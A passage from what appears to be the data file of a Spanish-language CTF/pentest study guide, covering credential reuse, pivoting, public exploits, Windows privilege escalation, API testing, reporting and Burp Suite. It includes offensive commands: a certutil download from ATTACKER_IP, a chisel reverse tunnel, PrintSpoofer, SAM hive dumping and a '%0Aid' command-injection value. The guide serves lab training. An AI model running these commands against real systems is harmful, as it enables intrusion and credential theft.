                        "why": "Reimprime lo ya crackeado: john guarda los resultados en su pot, así que no repites trabajo si cierras la terminal.",
                        "out": "Las parejas usuario:password ya resueltas. Cópialas a tu fichero de credenciales con su fuente antes de reutilizarlas.",
                    },
                ],
                "look": "La password en claro cuando cae. Si no cae en minutos con rockyou, probablemente el vector no era crackear.",
                "decide": "Crackeada -> reutiliza. No cae -> revisa si el hash era el objetivo real o si te falta contexto (salt, formato).",
            },
            {
                "title": "Reutiliza en todo",
                "idea": "El error más común es encontrar una credencial y probarla en un solo sitio. En CTF y en real, el password reuse es la norma: la misma clave suele valer para SSH, SMB, WinRM, un panel web o una base de datos. Cada credencial nueva reinicia tu enumeración.",
                "commands": [
                    {
                        "cmd": "nxc smb $IP -u $USER -p $PASS",
                        "why": "Valida la credencial contra SMB y de paso te dice si es admin local (que abre ejecución remota). Es la comprobación más informativa para empezar.",
                        "out": "[+] = credencial válida. '(Pwn3d!)' significa que eres admin local: ya puedes ejecutar comandos/volcar hashes. Solo [+] sin Pwn3d = acceso limitado.",
                    },
                    {
                        "cmd": "nxc winrm $IP -u $USER -p $PASS",
                        "why": "WinRM (5985) da shell interactiva en Windows. Comprueba si la misma credencial vale aquí, porque es la vía más cómoda de entrada.",
                        "out": "[+] (Pwn3d!) en WinRM significa que puedes lanzar evil-winrm y tener shell directa. Es tu billete de entrada a la máquina.",
                    },
                    {
                        "cmd": "ssh $USER@$IP",
                        "why": "En Linux, prueba la credencial por SSH. Es el acceso más directo y cómodo si la reutilizaron (que suele pasar).",
                        "out": "Un prompt de shell si entra. Si pide clave y la tienes, usa -i clave. Ya dentro, arranca la enumeración de privesc (whoami/id, sudo -l).",
                    },
                ],
                "look": "Un [+] en netexec (SMB/WinRM), un login SSH que entra, o acceso a un panel. Fíjate en 'Pwn3d!' que indica ejecución.",
                "decide": "Funciona en un servicio nuevo -> entra y vuelve a enumerar desde ahí. Anota cada credencial con su fuente y dónde la probaste.",
            },
        ],
    },
    {
        "id": "pivoting",
        "title": "Pivoting: llegar a la red interna",
        "phase": "pivot",
        "section": "pivoting",
        "summary": "Cuando la máquina comprometida ve servicios que tu Kali no alcanza.",
        "steps": [
            {
                "title": "Entiende por qué necesitas pivotar",
                "idea": "Has comprometido una máquina que tiene una segunda tarjeta de red o ve hosts internos que tu Kali no puede tocar directamente. El pivot es esa máquina: la usarás como puente para alcanzar la red interna. Primero confirma que existe esa red que tú no ves.",
                "commands": [
                    {
                        "cmd": "ip a",
                        "why": "Mira las interfaces del host comprometido. Una segunda NIC en un rango distinto al tuyo es la señal de que hay una red interna a la que solo esta máquina llega.",
                        "out": "Interfaces y sus IPs. Si ves algo como 10.10.20.x cuando tú atacas 10.10.10.x, esa segunda red es el objetivo del pivot.",
                    },
                    {
                        "cmd": "ip route",
                        "why": "La tabla de rutas revela a qué redes sabe llegar el pivot, incluso las que no cuelgan de una interfaz visible directamente.",
                        "out": "Rutas hacia rangos que tu Kali no tiene. Anota el CIDR interno: es lo que añadirás al túnel (ligolo) o escanearás vía proxychains.",
                    },
                    {
                        "cmd": "arp -a",
                        "why": "La cache ARP lista hosts internos con los que la máquina ya ha hablado. Te da IPs internas vivas sin lanzar un escaneo ruidoso todavía.",
                        "out": "Pares IP-MAC de vecinos internos. Esas IPs no aparecían en tu escaneo inicial -> son tus próximos objetivos dentro de la red.",
                    },
                ],
                "look": "Interfaces o rutas hacia rangos que tu Kali no tiene (ej. 10.10.20.0/24), y hosts en la tabla ARP que no aparecían en tu escaneo inicial.",
                "decide": "Ves una red interna nueva -> monta un túnel. No ves nada nuevo -> quizá no hay pivoting en esta room.",
            },
            {
                "title": "Monta el túnel",
                "idea": "El túnel enruta tu tráfico a través del pivot. Si tienes SSH, ssh -D te da un SOCKS gratis. Si solo ejecutas binarios, chisel o ligolo-ng crean el túnel en reverse (el pivot conecta hacia ti, útil cuando el firewall bloquea entrada). Ligolo es el más cómodo: te da una interfaz de red completa.",
                "commands": [
                    {
                        "cmd": "ssh -D 1080 -N user@$IP",
                        "why": "Si ya tienes SSH al pivot, -D monta un proxy SOCKS sin instalar nada. Es la vía más rápida y limpia cuando hay credenciales SSH válidas.",
                        "out": "No imprime nada (-N no abre shell): el éxito es que el puerto 1080 local queda escuchando. Compruébalo con ss -tlnp | grep 1080.",
                    },
                    {
                        "cmd": "chisel server -p 8000 --reverse",
                        "why": "En tu Kali levantas el lado servidor. --reverse permite que el pivot conecte hacia ti, esquivando firewalls que bloquean conexiones entrantes al pivot.",
                        "out": "'Reverse tunnelling enabled' y logs cuando el cliente conecte. Deja esta terminal abierta; el túnel muere si la cierras.",
                    },
                    {
                        "cmd": "./chisel client ATTACKER_IP:8000 R:socks",
                        "why": "En el pivot lanzas el cliente que conecta con tu servidor. R:socks crea un SOCKS reverse: tu tráfico saldrá por la red interna del pivot.",
                        "out": "'Connected' en ambos lados y un SOCKS (1080 por defecto) abierto en tu Kali. A partir de aquí, todo pasa por proxychains.",
                    },
                ],
                "look": "El mensaje de conexión establecida en tu servidor chisel/ligolo, o el puerto SOCKS local (1080) escuchando.",
                "decide": "SOCKS listo -> configura proxychains. Ligolo -> añade la ruta a la red interna con ip route add.",
            },
            {
                "title": "Usa el túnel para atacar dentro",
                "idea": "Con el túnel montado, cualquier herramienta puede alcanzar la red interna anteponiendo proxychains (que la rutea por el SOCKS). Ojo: por un SOCKS solo pasa TCP, así que usa -sT en nmap, no SYN scan. Valida siempre con un curl/nc antes de lanzar escaneos ruidosos.",
                "commands": [
                    {
                        "cmd": "proxychains nmap -sT -Pn -n -p80,445 10.10.20.5",
                        "why": "proxychains rutea nmap por el SOCKS hacia la red interna. -sT (connect scan) es obligatorio: por un SOCKS no pasa el SYN scan y darías todo por cerrado.",
                        "out": "Puertos abiertos del host interno. Ve a pocos puertos primero (-p80,445): un escaneo completo por proxychains es lentísimo. Servicios abiertos = nueva mini-room.",
                    },
                    {
                        "cmd": "proxychains crackmapexec smb 10.10.20.5 -u $USER -p $PASS",
                        "why": "Reutilizas las credenciales que ya tienes contra los hosts internos, también por el túnel. El password reuse cruza segmentos de red igual que cruza servicios.",
                        "out": "[+] / (Pwn3d!) contra máquinas internas. Un Pwn3d en un host interno te da ejecución allí: repite el ciclo recon-enum-acceso dentro de la red.",
                    },
                ],
                "look": "Servicios internos respondiendo a través del proxy: webs, SMB, otro DC. Es como empezar una room nueva dentro de la red.",
                "decide": "Host interno accesible -> repite el ciclo recon/enum/acceso contra él. Documenta la cadena atacante -> pivot -> red interna.",
            },
        ],
    },
    {
        "id": "cve-metodologia",
        "title": "Usar exploits y CVEs con cabeza",
        "phase": "access",
        "section": "cve-y-exploits",
        "summary": "Aprovechar PoCs públicos sin ejecutar basura a ciegas ni romper la máquina.",
        "steps": [
            {
                "title": "Confirma producto y versión exactos",
                "idea": "Un exploit solo sirve si coincide el producto Y el rango de versión. Perder tiempo con un CVE que no aplica es el error clásico. Saca la versión exacta de tu recon y busca; si la versión está fuera del rango vulnerable, descártalo o busca uno específico para esa versión.",
                "commands": [
                    {
                        "cmd": "searchsploit PRODUCTO VERSION",
                        "why": "Busca exploits conocidos para exactamente ese producto y versión. Filtrar por versión desde el principio evita perseguir CVEs que no aplican a tu objetivo.",
                        "out": "Títulos de exploits y su ruta. Fíjate si el título dice el rango de versión y si es 'Remote'/'Authenticated': eso decide si aplica y si necesitas login.",
                    },
                    {
                        "cmd": "searchsploit -m 12345",
                        "why": "Copia (mirror) el exploit a tu directorio actual para poder leerlo y editarlo. Nunca se ejecuta desde la base de datos directamente.",
                        "out": "Confirma la ruta del fichero copiado. Ábrelo antes de nada: el siguiente paso es leerlo, no lanzarlo.",
                    },
                ],
                "look": "Coincidencia exacta de producto y versión. Fíjate si el exploit es pre-auth (sin login) o post-auth (necesita credencial).",
                "decide": "Coincide y es pre-auth -> prioridad alta. Requiere admin o versión distinta -> baja prioridad, sigue enumerando.",
            },
            {
                "title": "Lee el exploit antes de ejecutarlo",
                "idea": "Nunca ejecutes un PoC de internet a ciegas: puede borrar datos, abrir puertos, o robar tu shell. Ábrelo, entiende qué hace, y busca comandos peligrosos. Cambia la IP/puerto a los tuyos y sustituye cualquier payload por algo inocuo (id, whoami) para la primera prueba.",
                "commands": [
                    {
                        "cmd": "sed -n '1,80p' exploit.py",
                        "why": "Lee la cabecera del exploit: descripción, autor, y sobre todo qué variables hay que rellenar. Entender el flujo antes de ejecutar evita sorpresas.",
                        "out": "Comentarios de uso, variables LHOST/RHOST/URL a configurar, y el CVE que explota. Si el código está ofuscado o minificado, desconfía y busca otro PoC.",
                    },
                    {
                        "cmd": "grep -nEi 'rm |curl|wget|socket|subprocess|system|eval' exploit.py",
                        "why": "Caza acciones peligrosas o conexiones externas: un PoC malicioso puede borrar ficheros, descargar algo de un servidor del autor, o robarte la shell.",
                        "out": "Líneas con esas llamadas. Un rm -rf, un wget a un dominio ajeno o un eval de datos remotos = bandera roja: no lo ejecutes tal cual, entiende cada línea.",
                    },
                    {
                        "cmd": "python3 exploit.py -h",
                        "why": "Ver la ayuda te dice los argumentos reales sin adivinar. Muchos PoCs traen un modo --check no destructivo para validar antes de explotar.",
                        "out": "Flags disponibles (--url, --lhost, --check, --cmd). Si existe --check, úsalo primero; solo lanza el payload completo cuando confirmes que es vulnerable.",
                    },
                ],
                "look": "Qué variables hay que rellenar (LHOST, URL, credenciales), y cualquier acción destructiva o conexión externa sospechosa.",
                "decide": "Código limpio y entendido -> adáptalo y pruébalo. Código ofuscado o destructivo -> busca otro PoC o hazlo manual.",
            },
            {
                "title": "Reproduce mínimo y escala",
                "idea": "Antes de lanzar el exploit completo, reproduce la petición mínima que dispara el bug (con curl o Burp) para confirmar que la máquina es vulnerable de verdad. Empieza con un comando inocuo; solo cuando confirmes ejecución, cambias a la reverse shell.",
                "commands": [
                    {
                        "cmd": "python3 exploit.py --check --url $URL",
                        "why": "El modo check confirma que el objetivo es vulnerable sin ejecutar payload destructivo. Ahorra tiempo y no rompe la máquina si el CVE no aplica.",
                        "out": "Un 'vulnerable'/'not vulnerable' del propio exploit. Si dice que no, revisa versión, ruta o si necesita autenticación antes de insistir.",
                    },
                    {
                        "cmd": "python3 exploit.py --url $URL --cmd 'id'",
                        "why": "Primera ejecución real pero inocua: id confirma RCE y te dice con qué usuario corres, sin abrir aún una shell que podría fallar ruidosamente.",
                        "out": "La salida de id (uid/gid). Confirmado esto -> repite el comando lanzando tu reverse shell hacia el listener que ya tienes abierto.",
                    },
                ],
                "look": "La salida de id/whoami que confirma ejecución remota, o el indicador de 'vulnerable' del propio exploit.",
                "decide": "Confirmado con comando inocuo -> lanza la reverse shell hacia tu listener. Falla -> revisa versión, ruta o requisitos de auth.",
            },
        ],
    },
    {
        "id": "privesc-windows",
        "title": "Escalar privilegios en Windows",
        "phase": "privesc",
        "section": "windows-privesc",
        "summary": "De shell de usuario a SYSTEM/admin: contexto, enumeración, vectores prioritarios y credenciales, en orden de rentabilidad.",
        "steps": [
            {
                "title": "Contexto y privilegios",
                "idea": "Antes de enumerar nada, oriéntate: quién eres, en qué host estás, y sobre todo qué privilegios de token tienes. En Windows, un solo privilegio habilitado (SeImpersonate, SeBackup) suele decidir todo el camino sin necesidad de buscar más. Esto te dice si priorizar tokens, servicios, tareas o credenciales.",
                "commands": [
                    {
                        "cmd": "whoami /all",
                        "why": "Un solo comando que junta usuario, grupos y privilegios de token. Es el punto de partida obligado: casi todo lo demás depende de lo que veas aquí.",
                        "out": "Tu usuario (a veces una cuenta de servicio tipo iis apppool). Grupos como Administrators o Backup Operators. Privilegios con State Enabled: SeImpersonate/SeAssignPrimaryToken, SeBackup/SeRestore, SeDebug.",
                    },
                    {
                        "cmd": "systeminfo",
                        "why": "Versión, build y arquitectura de Windows. Te dice si un exploit de kernel podría aplicar más adelante, y qué binarios (32/64 bits) subir después.",
                        "out": "OS Version/Build y System Type (x64/x86). Guarda esto para comparar con CVEs si los vectores de config no dan nada.",
                    },
                ],
                "look": "Privilegios de token con State: Enabled (no basta con que aparezcan listados, tienen que estar habilitados). Grupos privilegiados. Versión exacta del sistema.",
                "decide": "SeImpersonate/SeAssignPrimaryToken habilitado -> prioridad máxima, salta a family Potato. Sin privilegios especiales -> sigue con la enumeración sistemática.",
            },
            {
                "title": "Enumeración rápida",
                "idea": "Recorre servicios, tareas programadas y configuraciones en busca de permisos flojos o credenciales sueltas. Una herramienta automatizada como winPEAS ahorra tiempo y resalta lo probable, pero no sustituye entender qué está buscando cada check: los falsos positivos son comunes.",
                "commands": [
                    {
                        "cmd": "certutil -urlcache -split -f http://ATTACKER_IP:8000/winPEASx64.exe C:\\Windows\\Temp\\winpeas.exe",
                        "why": "Transfiere winPEAS a la víctima usando una utilidad de Windows que casi nunca está bloqueada (certutil no suele estar en listas de detección tan vigiladas como powershell -enc).",
                        "out": "El binario en C:\\Windows\\Temp. Ejecútalo y guarda la salida (> winpeas.log) para no perder el scroll de la consola.",
                    },
                    {
                        "cmd": "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\"",
                        "why": "Lista servicios cuyo ejecutable NO está en System32 (los de terceros son los candidatos reales a permisos flojos o rutas sin comillas).",
                        "out": "Nombre, ruta y modo de arranque de cada servicio no estándar. Rutas con espacios y sin comillas, o en carpetas de terceros, son las que revisas primero.",
                    },
                ],
                "look": "Servicios de terceros con rutas raras. Tareas programadas que ejecutan scripts en carpetas escribibles. Credenciales en ficheros de config o el historial de PowerShell.",
                "decide": "winPEAS resalta algo en rojo/amarillo -> válidalo contra el vector concreto antes de actuar. Nada destaca -> pasa a los vectores prioritarios manualmente.",
            },
            {
                "title": "Vectores prioritarios",
                "idea": "Con el contexto y la enumeración hechos, ataca en orden de rentabilidad: primero el privilegio de token si lo tienes (es casi SYSTEM garantizado), después servicios mal configurados y AlwaysInstallElevated, que son limpios y fiables cuando aplican.",
                "commands": [
                    {
                        "cmd": "PrintSpoofer64.exe -i -c cmd",
                        "why": "Si tienes SeImpersonate, este es el camino más directo a SYSTEM: fuerza al spooler a autenticarse contra el exploit y suplanta su token.",
                        "out": "Un cmd nuevo donde whoami dice 'nt authority\\system'. Si falla, prueba GodPotato o JuicyPotato según la versión exacta de Windows.",
                    },
                    {
                        "cmd": "sc qc <servicio> && icacls \"C:\\ruta\\al\\servicio.exe\"",
                        "why": "Comprueba de un vistazo la ruta/cuenta del servicio (sc qc) y quién puede escribir su ejecutable (icacls). Ambos datos juntos te dicen si el servicio es explotable.",
                        "out": "BINARY_PATH_NAME y SERVICE_START_NAME (LocalSystem = objetivo jugoso). En icacls, un (F) o (M) para tu usuario/grupo sobre el .exe confirma que puedes reemplazarlo.",
                    },
                ],
                "look": "SeImpersonate habilitado. Servicios con SERVICE_CHANGE_CONFIG o binario escribible. Rutas de servicio sin comillas con directorio intermedio escribible. AlwaysInstallElevated a 1 en HKCU y HKLM.",
                "decide": "Cualquiera de estos confirmado -> explótalo, es limpio y fiable. Ninguno aplica -> pasa a credenciales y privilegios especiales.",
            },
            {
                "title": "Credenciales y privilegios especiales",
                "idea": "Si los vectores de configuración no dieron nada, busca credenciales guardadas por el propio Windows: gestor de credenciales, historial de PowerShell, ficheros de despliegue. Si tienes SeBackup/SeRestore, saltas directo a volcar el SAM sin depender de encontrar nada a mano.",
                "commands": [
                    {
                        "cmd": "cmdkey /list",
                        "why": "Lista credenciales guardadas por Windows Credential Manager. Si hay alguna con /savecred, puedes reutilizarla con runas sin conocer la password.",
                        "out": "Target y usuario de cada credencial guardada. Combina con runas /savecred /user:<usuario> cmd para reutilizarla sin verla en claro.",
                    },
                    {
                        "cmd": "reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM system.hive",
                        "why": "Si whoami /all mostro SeBackupPrivilege, esto salta el bloqueo normal del SAM y te lleva los hashes locales, incluido administrator, sin depender de encontrar nada más.",
                        "out": "Dos ficheros .hive. Bájalos a tu Kali y extrae los hashes con impacket-secretsdump -sam sam.hive -system system.hive LOCAL.",
                    },
                ],
                "look": "Credenciales en cmdkey, PowerShell history (ConsoleHost_history.txt), Unattend.xml/sysprep, o hives SAM/SYSTEM volcables.",
                "decide": "Credencial encontrada -> pruébala (reuse) o crackeala si es un hash. Hash NTLM de administrator -> Pass-the-Hash directo con evil-winrm -H.",
            },
            {
                "title": "Confirmación y cierre",
                "idea": "Confirma que de verdad tienes SYSTEM o admin, no solo un privilegio a medio camino, y anota el vector exacto que funcionó: te hace falta para el writeup y para reconocer el mismo patrón en la siguiente room. Deja el kernel exploit y el bypass de UAC como plan B: son más ruidosos e inestables que los vectores anteriores.",
                "commands": [
                    {
                        "cmd": "whoami /priv",
                        "why": "Confirmación final: verifica que corres como nt authority\\system (o que tu usuario ya está en el grupo Administrators con integridad High) antes de dar la escalada por cerrada.",
                        "out": "El usuario activo debe ser nt authority\\system, o tu whoami /groups debe mostrar integridad High si elevaste vía administrator.",
                    },
                ],
                "look": "Confirmación clara de SYSTEM o admin con integridad alta, no solo pertenecer al grupo Administrators con integridad Medium (eso todavía necesitaría un bypass de UAC).",
                "decide": "SYSTEM confirmado -> recoge la flag y documenta el vector exacto (qué privilegio/servicio/credencial lo permitió). Sigues en Medium/usuario normal -> vuelve a los vectores prioritarios antes de recurrir a un exploit de kernel.",
            },
        ],
    },
    {
        "id": "api-paso-a-paso",
        "title": "APIs: del inventario a la autorización",
        "phase": "enumeration",
        "section": "web-apis-y-autorizacion",
        "summary": "Una secuencia corta para mapear endpoints, validar sesiones y probar permisos sin perder el hilo.",
        "steps": [
            {
                "title": "Construye el inventario",
                "idea": "Empieza por documentación y métodos observables. El objetivo no es lanzar payloads, sino saber qué recursos existen y qué entrada controla cada uno.",
                "commands": [
                    {"cmd": "curl -sS $URL/swagger.json", "why": "Busca un contrato OpenAPI publicado.", "out": "Rutas, métodos y esquemas disponibles."},
                    {"cmd": "curl -sS -i -X OPTIONS \"$URL/api/resource\"", "why": "Comprueba métodos aceptados por un recurso.", "out": "Cabecera Allow y comportamiento del endpoint."},
                ],
                "look": "Versiones de API, endpoints administrativos, parámetros identificadores y respuestas JSON.",
                "decide": "Si falta documentación, continúa con el tráfico de la SPA y compara respuestas por método.",
            },
            {
                "title": "Fija el contexto de sesión",
                "idea": "Separa siempre peticiones públicas, autenticadas y de otra cuenta. Esa comparación evita confundir un fallo de autenticación con uno de autorización.",
                "commands": [
                    {"cmd": "curl -sS \"$URL/api/me\" -H \"Authorization: Bearer $TOKEN\"", "why": "Confirma que el token identifica al usuario esperado.", "out": "Perfil, rol o contexto de identidad."},
                    {"cmd": "curl -sS -i \"$URL/api/me\"", "why": "Establece la respuesta sin credenciales.", "out": "401/403 o respuesta pública."},
                ],
                "look": "Cookies, cabeceras Bearer, expiración, refresh y diferencias entre 401 y 403.",
                "decide": "Si el token no cambia el contexto, revisa formato, expiración y endpoint de login antes de probar permisos.",
            },
            {
                "title": "Prueba autorización por objeto",
                "idea": "Con dos cuentas de laboratorio, conserva el mismo endpoint y cambia solo el identificador del objeto. Un 200 sobre un objeto ajeno es más importante que una respuesta genérica de login.",
                "commands": [
                    {"cmd": "curl -sS \"$URL/api/users/1001\" -H \"Authorization: Bearer $TOKEN_A\"", "why": "Lee un objeto propio como cuenta A.", "out": "Campos y código de respuesta de referencia."},
                    {"cmd": "curl -sS -i \"$URL/api/users/1002\" -H \"Authorization: Bearer $TOKEN_A\"", "why": "Repite con un identificador de otra cuenta.", "out": "403/404 esperado; un 200 con datos ajenos confirma una pista IDOR/BOLA."},
                ],
                "look": "Cambios de status, tamaño y campos sensibles al variar solo el ID.",
                "decide": "Si hay acceso cruzado, documenta el control ausente y no sigas escalando sin acotar el impacto.",
            },
            {
                "title": "Revisa JWT y operaciones GraphQL",
                "idea": "Cuando la API usa JWT o GraphQL, valida claims y superficie antes de modificar nada. Introspection y errores estructurados suelen revelar el modelo de datos.",
                "commands": [
                    {"cmd": "jwt_tool $TOKEN", "why": "Inspecciona algoritmo, claims y validaciones habituales.", "out": "Algoritmo, exp, aud, sub y pruebas sugeridas."},
                    {"cmd": "curl -sS \"$URL/graphql\" -H 'Content-Type: application/json' --data '{\"query\":\"{ __typename }\"}'", "why": "Confirma si el endpoint procesa GraphQL.", "out": "Respuesta data o errores GraphQL."},
                ],
                "look": "Algoritmo inesperado, claims de rol, introspection abierta y mutations sin controles.",
                "decide": "Prioriza una validación reproducible de permisos; deja las pruebas de alteración para un laboratorio controlado.",
            },
            {
                "title": "Cierra con evidencia y siguiente paso",
                "idea": "Un hallazgo útil incluye petición, identidad, respuesta esperada y respuesta observada. Así puedes volver atrás, comparar otra cuenta y decidir si toca corregir el alcance o pasar a otra fase.",
                "commands": [
                    {"cmd": "curl -sS -i \"$URL/api/resource\" -H \"Authorization: Bearer $TOKEN\"", "why": "Guarda una respuesta completa como evidencia mínima.", "out": "Status, cabeceras y cuerpo para comparar en el writeup."},
                ],
                "look": "Request reproducible, contexto de cuenta, objeto afectado y límite del impacto.",
                "decide": "Si el control funciona, pasa al siguiente endpoint del inventario; si falla, conserva el caso mínimo y enlázalo con [[idor-bola]].",
            },
        ],
    },
    {
        "id": "pt1-engagement",
        "title": "PT1: engagement de 48 horas e informe",
        "phase": "closeout",
        "section": "notas-y-cierre",
        "summary": "Organizar alcance, evidencias, hallazgos y reporte como un pentest completo, no como una sucesión de flags.",
        "steps": [
            {
                "title": "Divide la ventana antes de tocar el objetivo",
                "idea": "PT1 evalúa un engagement completo dentro de una ventana de 48 horas. Reserva bloques para reconocimiento, explotación, reenumeración, evidencias y redacción. Define también una hora de corte: seguir atacando hasta el último minuto suele producir un informe incompleto.",
                "commands": [],
                "look": "Alcance, activos, credenciales iniciales, hora de inicio, restricciones y entregables.",
                "decide": "Si no puedes explicar qué está dentro de alcance y cuándo dejarás de explotar, aún no empieces las pruebas.",
            },
            {
                "title": "Crea una estructura de evidencia reproducible",
                "idea": "Cada hallazgo debe conservar origen, comando o petición, salida relevante, captura y decisión desbloqueada. La evidencia se recoge durante la prueba; reconstruirla al final consume tiempo y puede ser imposible.",
                "commands": [
                    {
                        "cmd": "mkdir -p nmap web loot creds hashes screenshots exploits notes",
                        "why": "Separa outputs, loot y capturas desde el inicio para poder citar rutas concretas en el informe.",
                        "out": "Directorios vacíos preparados para guardar cada evidencia en su contexto.",
                    },
                    {
                        "cmd": "touch notes/00-index.md notes/creds.md notes/commands.md notes/timeline.md",
                        "why": "Mantiene índice, credenciales, comandos y cronología separados sin depender de la memoria.",
                        "out": "Cuatro ficheros listos para actualizar durante todo el engagement.",
                    },
                ],
                "look": "Hora, activo, identidad usada, evidencia obtenida y siguiente decisión para cada avance.",
                "decide": "Si un resultado no cambia ninguna decisión ni demuestra impacto, no merece ocupar el centro del informe.",
            },
            {
                "title": "Convierte la cadena de ataque en hallazgos",
                "idea": "No redactes una lista cronológica de comandos. Agrupa por causa raíz: condición vulnerable, pasos mínimos, evidencia, impacto y activos afectados. Separa la vulnerabilidad del camino completo que permitió encadenarla con otras.",
                "commands": [],
                "look": "Título preciso, precondiciones, prueba reproducible, resultado observado, impacto y causa raíz.",
                "decide": "Dos técnicas con la misma causa raíz suelen ser un hallazgo; dos causas independientes deben mantenerse separadas.",
            },
            {
                "title": "Prioriza por impacto y explica la mitigación",
                "idea": "La severidad no depende de lo espectacular del payload, sino del impacto demostrable y de las condiciones necesarias. La mitigación debe corregir la causa raíz: permisos, validación, segmentación, configuración o gestión de credenciales.",
                "commands": [],
                "look": "Confidencialidad, integridad, disponibilidad, privilegios obtenidos, alcance lateral y facilidad de explotación.",
                "decide": "Si la mitigación solo bloquea tu payload concreto, revísala: probablemente no corrige la vulnerabilidad.",
            },
            {
                "title": "Haz QA antes de entregar",
                "idea": "Reserva el último bloque para repetir los pasos mínimos desde tus notas, revisar capturas, eliminar secretos innecesarios y comprobar que un tercero entiende el ataque sin haber estado en la room.",
                "commands": [],
                "look": "Pasos numerados, evidencias legibles, activos correctos, impacto coherente, mitigaciones accionables y ausencia de passwords en claro innecesarias.",
                "decide": "Entrega cuando cada afirmación importante tenga evidencia y cada hallazgo pueda reproducirse dentro del alcance.",
            },
        ],
    },
    {
        "id": "burp-suite",
        "title": "Burp Suite de principio a fin",
        "phase": "enumeration",
        "section": "web-discovery",
        "summary": "Qué es, qué puede hacer, cuándo abrirlo y cómo usar cada módulo (Proxy, Repeater, Intruder, Decoder) sin perderte.",
        "steps": [
            {
                "title": "Qué es Burp y cuándo abrirlo",
                "idea": "Burp es un proxy que se mete ENTRE tu navegador y el servidor: cada petición pasa por él, puedes verla, pararla y modificarla antes de que salga, y ver la respuesta cruda. Eso te da un control sobre la petición que el navegador solo no permite. Ábrelo siempre que trabajes una web y necesites: ver peticiones ocultas (APIs, llamadas AJAX), tocar parámetros, cabeceras o cookies que el navegador no te deja editar, o repetir una petición cambiando algo cada vez. Community Edition (gratis) cubre casi todo TryHackMe; Pro añade el scanner automático y un Intruder sin límite de velocidad.",
                "commands": [],
                "look": "Piensa en Burp como unas 'pinzas' para la petición HTTP: la agarras a mitad de camino y la manipulas. Todo lo demás (Repeater, Intruder) es reenviar esa petición de formas distintas.",
                "decide": "Si solo quieres fuzzear rutas o parámetros a gran velocidad, ffuf va mejor. Burp brilla cuando necesitas ver y MANIPULAR peticiones concretas a mano.",
            },
            {
                "title": "Montaje: proxy + navegador + certificado CA",
                "idea": "Burp escucha por defecto en 127.0.0.1:8080 y tu navegador tiene que enviar su tráfico ahí. Lo más cómodo es el navegador integrado de Burp (Proxy > Intercept > Open Browser): ya viene configurado y con el certificado puesto. Si prefieres tu Firefox, apunta su proxy a 127.0.0.1:8080 (usa la extensión FoxyProxy) e instala el certificado CA de Burp para que las webs HTTPS no den error de certificado.",
                "commands": [
                    {
                        "cmd": "http://burp",
                        "why": "Con el proxy de Burp activo, esta URL mágica sirve la página de Burp para descargar su certificado CA.",
                        "out": "El botón 'CA Certificate' descarga un .der; impórtalo en el navegador como autoridad de confianza y HTTPS dejará de quejarse.",
                    },
                ],
                "look": "El HTTP history (Proxy > HTTP history) llenándose de peticiones cuando navegas = el proxy funciona.",
                "decide": "HTTPS da 'certificate error' -> te falta importar el CA. No ves tráfico -> el navegador no está apuntando al proxy 127.0.0.1:8080.",
            },
            {
                "title": "Proxy / Intercept: parar y modificar en vuelo",
                "idea": "Con 'Intercept is on', cada petición se PARA antes de salir: editas URL, parámetros, cabeceras o cuerpo y luego pulsas Forward para dejarla seguir, o Drop para descartarla. Es como pausar la web en mitad de una petición. Ojo: con intercept ON el navegador se queda colgado hasta que hagas Forward, así que la mayor parte del tiempo lo tendrás OFF y trabajarás desde el HTTP history, donde queda registrada cada petición ya enviada.",
                "commands": [],
                "look": "El botón Intercept is on/off y, en HTTP history, la lista de peticiones con su método, URL, status y longitud.",
                "decide": "Para explorar: intercept OFF y revisa HTTP history. Para tocar UNA petición concreta: intercept ON justo antes de mandarla, o mejor mándala a Repeater.",
            },
            {
                "title": "Repeater: la herramienta que más usarás",
                "idea": "Repeater coge una petición y te deja reenviarla las veces que quieras, cambiando lo que quieras entre envío y envío, con la respuesta al lado. Es el banco de pruebas manual: tantear una SQLi, tocar un id para probar IDOR, cambiar un rol o un valor de cookie, ajustar una cabecera. Flujo: en HTTP history, click derecho sobre la petición > Send to Repeater, ve a la pestaña Repeater y pulsa Send.",
                "commands": [
                    {
                        "cmd": "Ctrl+R",
                        "why": "Atajo para enviar la petición seleccionada a Repeater desde Proxy o Target sin usar el menú.",
                        "out": "La petición aparece en una pestaña nueva de Repeater, lista para editar y reenviar con Send (Ctrl+Space).",
                    },
                ],
                "look": "La respuesta cruda (status, cabeceras, cuerpo) en cada envío. Compara cómo cambia al modificar tu entrada.",
                "decide": "Si un cambio pequeño (una comilla, un id+1, otra cookie) altera la respuesta, tienes un hilo del que tirar (SQLi, IDOR, control de acceso). Si hay que probar muchos valores, pasa a Intruder.",
            },
            {
                "title": "Intruder: automatizar un parámetro",
                "idea": "Cuando quieres probar MUCHOS valores en una posición (usuarios, contraseñas, ids, payloads), Intruder automatiza el reenvío. Seleccionas el valor a variar y pulsas Add para marcar la posición, eliges el tipo de ataque (Sniper, un payload sobre una posición, es el más común) y cargas una lista. En Community Edition va con velocidad limitada, pero para las listas pequeñas de THM sirve.",
                "commands": [],
                "look": "La tabla de resultados: ordénala por Status y por Length. Una fila con status o longitud DISTINTA del resto suele ser el acierto (login válido, id que existe, filtro que reacciona).",
                "decide": "Diferencia clara en Status/Length -> ese es tu valor. Todo responde igual -> cambia la posición o el tipo de payload. Para fuerza bruta grande y rápida, mejor hydra o ffuf por fuera.",
            },
            {
                "title": "Decoder / Inspector: codificar y decodificar",
                "idea": "La web usa codificaciones (URL, Base64, hex, HTML) y Burp te las traduce en un clic. Sirve para entender un token, una cookie o un parámetro ofuscado, y para CONSTRUIR payloads que pasen filtros. Caso clásico: un filtro bloquea ';' y '|' pero no el salto de línea; codificas LF como %0A y lo cuelas como separador de comandos. En Burp moderno tienes el panel Inspector (a la derecha en Repeater) o el Decoder clásico.",
                "commands": [
                    {
                        "cmd": "127.0.0.1%0Aid",
                        "why": "%0A es un salto de línea URL-encoded; muchos backends lo decodifican y lo tratan como separador de comandos. Con Decoder pasas de texto a %0A y al revés.",
                        "out": "Si la respuesta ejecuta 'id' además del ping esperado, el filtro era incompleto (concepto 'filtros incompletos' en Aprender).",
                    },
                ],
                "look": "El texto ya codificado o decodificado, listo para pegar en Repeater sin romper la sintaxis de la petición.",
                "decide": "Un valor que parece Base64/hex -> decodifícalo, suele esconder usuario, rol o firma. Un filtro bloquea un carácter -> prueba su versión codificada.",
            },
            {
                "title": "Target / Scope / Site map",
